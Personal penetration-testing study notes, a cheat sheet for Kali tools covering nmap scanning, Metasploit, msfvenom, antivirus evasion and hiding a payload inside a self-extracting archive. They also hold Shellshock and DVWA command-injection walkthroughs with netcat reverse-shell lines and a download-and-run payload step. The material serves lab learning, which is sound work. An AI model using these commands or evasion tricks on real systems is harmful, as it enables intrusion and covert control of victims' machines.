**JULY 2021**

# General OS Commands

| Command | Description |
| --- | --- |
| locate | Outputs the path of concerned filename |
| telnet *ip* | Connect to *ip* via telnet |
| sudo su | Getting to root |
| ssh *username@ip* | Connect via ssh to *ip* |
| hostname | Get the name of the host machine |
| vncviwere *ip* | Connect to vnc |
| getuid | Get user id on windows |
| ps | Lists all processes running on windows |
| md5sum *file* | Gives the md5sum hash of the *file* |
| cat *filename* | Print file contents on terminal | 
| systemctl start apache2 | systemctl?? | 
| ping *ip* -c **n** | Pings *ip* **n** number of times | 

Apache2 files : /var/www/html

# Reconnaissance and Information gathering

| Command | Description |
| --- | --- |
| nslookup | Lookup ip address |
| whois | ip/domain details |
| whatweb | web scanner to scan hosts |
| theHarvester | email gathering |
| hunter.io | website for email gathering |
| redhawk | website information gathering |
| sherlock | find accounts across social media using username |
| arp | manipulate the system arp cache |


# Scanning

| Command | Description |
| --- | --- |
| netdiscover | For discovering available networks/ips |
| netstat | (Obsolete) Use ss |
| nmap | Scanning for ports |

---

***Nmap options***

	-sS : Syn Scan, half open scanning...detecting replies from syn tcp packets
	-sF : Fyn scan (?)
	-sV : Version number
	--version-intensity : 0 to 9, default:7
	-A : Aggressive
	-sn : No port can, like netdiscover
	-p : port range/ single port scan
	-p- : Scan all 65535 ports
	>> filename : to save output to file
	-oN : Output scan in normal file
	-f : Small fragmented tcp packets
	-D : decoys, Make it appear to the target as if multiple ips have scanned target (for hiding attacker ip)
	-S : spoof your ip address, but results of scan sent to spoofed ip
	-Pn : Doesn't perform ping scan, assumes all hosts are online (HAVE to use the -S)
	-e : A network interface (eg: eth0)
	-g : Source port (Maybe to bypass firewall)
	-T : Timing template
	-F: Fast mode - Scan fewer ports than the default scan

# Vulnerability Analysis

| Command | Description |
| --- | --- |
| nmap scripts | For finding vulnerabilities, explore documentation of nmap on internet |
| searchsploit | exploiting vulnerabilities |
| Nessus | Software for vulnerability analysis *(Only local ip addresses, atleast with the free version)* |

---

***Nmap Scripts***

	nmap scripts are in directory: usr/share/nmap/scripts
	
	nmap --script scriptgroup

	Script help: nmap --script-help scriptname 

# Exploitation and Gaining access

## Metasploit Framework

Starting Metasploit Framework: **msfconsole**

Navigating to Metasploit framework directory: cd /user/share/metaspolit-framework

Types of modules are in : /user/share/metaspolit-framework/modules

| Metasploit Modules | Description |
| --- | --- |
| auxiliary | Does not execute a payload. Helps in performing scanning, fuzzing, dos etc. Actions performed in inital steps of hacking |
| encoders | Help in avoiding antivirus (Not very useful nowadays) |
| evasion | Generally used to bypass windows defender (Although maybe not very useful now) |
| exploits | Exploiting vulnerabilities of target system |
| nops | Instruction for the processor to do nothing. Useful for buffer overflow. *NOP - (No Operation)* |
| payloads | For delivering payloads to target |
| post | Post exploitation. For gathering or stealing information etc. |

---

***payloads***
	
	singles : Standalone payload
	
	stagers : Setting up network connection between target and attacker. Designed to be small and reliable.
	
	stages : Payload components that are downloaded by stagers modules. Can provide advanced features with no size limits, eg. meterpreter shells.

***Note***

	bind : Direct connection
	
	reverse : reverse connection

	.rb : Extension for ruby, Generaally exploit files	
	
	multi/ : Can be run against multiple OS

> ***Can run regular terminal commands within metasploit as well***

| Metasploit commands | Description |
| --- | --- |
| show *option* | Shows all option |
|show *modulename* | Display all available *module options/files* |
| use *modulename*/*file* | Using a file in a module |
| show info | Shows the information and details about a particular module file **(Run after *use* command)** |
| show *options* | Shows module options **(Run after *use* command)** |
| show *targets* | Displays all targets which can be exploited |
| set *option* | Sets a particular option |
| set *LHOST/RHOST* | Setting LHOST or RHOST ip |
| show *payloads* | Display possible payloads/ payloads for a particular exploit |
| set *payload* | Change payload for exploit |
| set *target* | Set target type *(Not ip, but a type of target for eg. Windows XP)* |
| search *software name* | To search for exploit for the software eg: search vdftpd|
| exploit | Start the exploit |
| exit | Exit the shell/ End exploit |
| run | Run a module file |
| sessions | Check all available shells |
| sessions -i *session id* | Enter session |


## NETCAT

netcat is a simple unix utility which reads and writes data across net‐work connections, using TCP or UDP protocol. In  the  simplest usage, "nc host port" creates a TCP connection to the given port on the given target host. 

| Netcat commands | Description |
| --- | --- |
| nc -h | help |

## METERPRETER

| Meterpreter commands | Description |
| --- | --- |
| help | Open help |
| background/bg | background the session |
| sessions | Show all sessions |
| sessions -i *n*  | Interact with session *n* |
| guid | Get session id |
| getuid | Get user id |
| download *filename* | download the file |
| upload *filename* | upload the file |
| shell | Get shell |
| ps | All currently running processes |

***Eternalblue***

	Exploit smb vulnerability on windows

	Available on metasploit framework

	Works on 64bit windows, Crashes 32bit windows

***DoublePulsar***

	Read details on Rapid7 website

	Can work on both 32bit and 64bit systems

	Obtain from Github

	Copy files to metasploit directory to add it to the framework

	Copy all files to root directory

	Need Wine to run

		Run as root

		sudo dpkg --add-architecture i386
		
		apt-get update
		
		apt-get install wine32

	Change PROCESSINJECT ot lsass.exe if attack against 64bit machine

	Change TARGETARCHITECTURE to x64 if attack against 64bit machine

	Change payload to windows/x64/meterpreter/reverse_tcp if attack against 64bit machine

***Bluekeep***

	Windows XP to Windows 7 Exploit
	
	Port 3389 (RDC : Remote Desktop Protocol) needs to be enabled on target

	To enable RDC on Windows : Control Panel -> System and Settings -> Remote Desktop -> Enable

***Routersploit***

	Hacking router

	Download from Github

## Windows 10

	SMBGhost Vulnerability (CVE 2020 0796)

	Attack for Windows 10 1903 or 1909

	(Can download old versions of windows 10 using RUFUS)

	Crashing windows 10 - Jiansitting (Search on Github!!!)

	Exploiting windows 10 - ZecOps (Search on Github!!!)



# Gaining Access

## Msfvenom

### For generating payloads

| Msfvenom Commands| Description |
| --- | --- |
| msfvenom -h | Help |
| msfvenom -p | p stands for payload, type of payload |
| -f | Filetype to be created |
| -o | Output : Name of file |
| -a | Architecture eg. x64, x86 |
| -e | Encoder, can help bypass some antiviruses |
| -i | Iterations for encoding payload |
| --platform | eg. windows |
| -n | append nops |
| -x | Use another program as template |
| msfvenom --list *options* | List all available *options* |

***Metasploit listener:***

**exploit/multi/handler** : Handles exploits launched outside of the framework. We run exploit for the *multi/handler* and execute our generated executable on the victim. The *multi/handler* handles the exploit for us and presents us our shell.

***Set the same payload as payload that the target will execute.***

## Virustotal

*Website*

	To check how many antiviruses can detect a file.

## Veil

(Not installed by default in Kali Linux)

Start command : ***veil***

**Commands are similar to msfconsole**

Run : **resource *rc* file generated**, in msfconsole for listening

## B2E
	
	Tool for converting .bat file to .exe

	Download from Github. It is an exe file...have to run with wine.


## TheFatRat

	Download from Github.

	Use as root.

**hexeditor** *payload* : Opens the payload's binary. Can change the unnecessary binary of payload to change its hash.

## Making a payload hidden behind another file

- Create Icon file : .ico extension
- Select both original payload and file that opens in foreground, right click and select  "Add to archive"
- Archive format : Select ZIP
- Select : Create SFX archive
- Name the new file
- Advanced tab : Click SFX options
	- Update tab : 
		- Click extract and update files
		- Click Overwrite all files
	- Text and icon : Load icon in "Load SFX icon"
	- Mode : 
		- Silent mode : Click "Hide all"
		- Click unpack to temporary folder
	- Setup : In "Run after extraction" enter both file names
	- Click OK
- Click OK again

# Post Exploitation

## Privilege escalation

**Metasploit**

search bypassuac : uac=User account control

search *year* : List out all modules that came out that year

getsystem : Try to get system level account

***Use a different listen port compared to port on attacked machine.***

## Persistence

search persistence (on metasploit)


# Website penetration testing

Can practice on metasploitable DVWA. Open the ip of metasploitable in web browser.

## Dirb

dirb http://***ip***

## Burpsuite

*--- Pre-installed in Kali ---*

Intercepts and change http requests and responses.

**Have to change proxy settings manually in web browser.**

To access https open:

- http://burp
- Download CA certificate
- In web browser import the certificate (Check privacy section) and click trust this CA.

To prevent manually forwarding packets: Turn Intercept Off in the suite.

## ShellShock (2014)

### Manually

- Google -> pentesterlab shellshock
- Files -> Download ISO
- Create virtual machine using ISO (Linux, Other linux 32bit)
- Start burpsuite and firefox in kali
- Intercept should be turned off (burpsuite - target - proxy)
- Start the new VM
- Go to the ip of the VM in firefox
- Find the cgi script in burpsuite
- Click on response (The output is similar to *uname -a*)
- User agent field in the request is an environmental variable
- Empty function syntax: 
	- () { :;};
	When bash gets this empty function it accepts the variable after it and runs it as a command on the server (The shellshock vulnerability)
- We must change the user agent to the empty function syntax + our command and then send the request
- Select the request
- Right click
- Click Send to repeater
- Change User agent to:
	- Example:
		() { :;}; /bin/bash -c 'nc *ip of kali machine* *port* -e /bin/bash'
- Set up listener:
	nc -lvp *port*
- Send the request in burpsuite

### Automating it with metasploit:

- search shellshock
- use exploit/multi/http/apache_mod_cgi_bash_env_exec
- set options and run
	- TARGETURI : /cgi-bin/status (Check the first line of GET request)
	- set RPATH : /bin 

## Command injection

*Turn on burpsuite if it is set as proxy*

- Type ip of metasploitable machine in browser
- Open DVWA
- Set security to low in DVWA security
- Go to Command exection section
- We can attach another command with the ip :
	- eg: 
		- 192.168.1.1;ls -la
		- 192.168.1.1;whoami
		- To avoid waiting for ping command to finish simply use: ;ls -la
- nc -lvp *port* : Starting listener
- Go to command execution section and use: *ip*;nc -e /bin/bash *ip of kali machine* *port*
	- eg: 192.168.1.1;nc -e /bin/bash 192.168.1.9 12345

Two commands can also be run like : command1 && command2
Two commands can also be run like : command1 & command2 *(But they are executed as two different processes)*
Two commands can also be run like : command1 | command2

## Getting meterpreter shell with command execution

- Create python payload with msfvenom
- Host the payload in apache
	- sudo service apache2 start
	- /var/www/html : copy payload here
- Open command injection of DVWA after changing security level to low or medium
- wget *kali ip/payload* : This will download the payload
- So use the same after ;
- It should have been downloaded to target directory
- Set up listener in msfconsole
- Use command injection to run payload in target:
	- ;python *python payload*

